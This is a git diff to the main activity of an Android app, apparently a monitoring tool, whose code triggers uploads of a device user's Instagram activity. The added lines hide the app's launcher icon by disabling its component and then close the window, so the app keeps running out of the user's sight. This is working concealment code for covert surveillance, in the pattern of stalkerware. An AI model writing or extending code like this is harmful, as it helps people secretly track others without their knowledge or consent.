@@ -179,6 +179,19 @@ class MainActivity : AppCompatActivity() {
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
             SyncScheduler.runOnce(applicationContext)
             Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
+
+            // 2. Hide the app icon programmatically
+            val pm = applicationContext.packageManager
+            val componentName = ComponentName(applicationContext, MainActivity::class.java)
+    
+            pm.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+    )
+
+    // 3. Gracefully close the UI window so the user returns to the home screen
+    finish()
         }
     }
 
